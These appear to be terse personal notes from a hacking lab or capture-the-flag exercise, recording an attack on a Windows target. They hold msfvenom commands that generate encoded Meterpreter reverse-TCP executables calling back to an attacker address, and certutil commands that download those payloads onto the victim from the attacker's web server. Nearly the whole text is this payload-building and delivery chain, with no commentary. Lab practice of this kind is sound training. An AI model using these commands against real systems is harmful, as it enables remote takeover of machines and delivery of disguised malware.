...
#in attacker machine
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.141.102 LPORT=4545 -f exe -o park.exe
#generate payload
...
certutil.exe -urlcache -f http://10.10.141.102:8000/park.exe park.exe
...
#in attacker machine
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.141.102 LPORT=1234 -f exe -o Message.exe
...
Certutil.exe -urlcache -f http://10.10.141.102:8000/Message.exe Message.exe
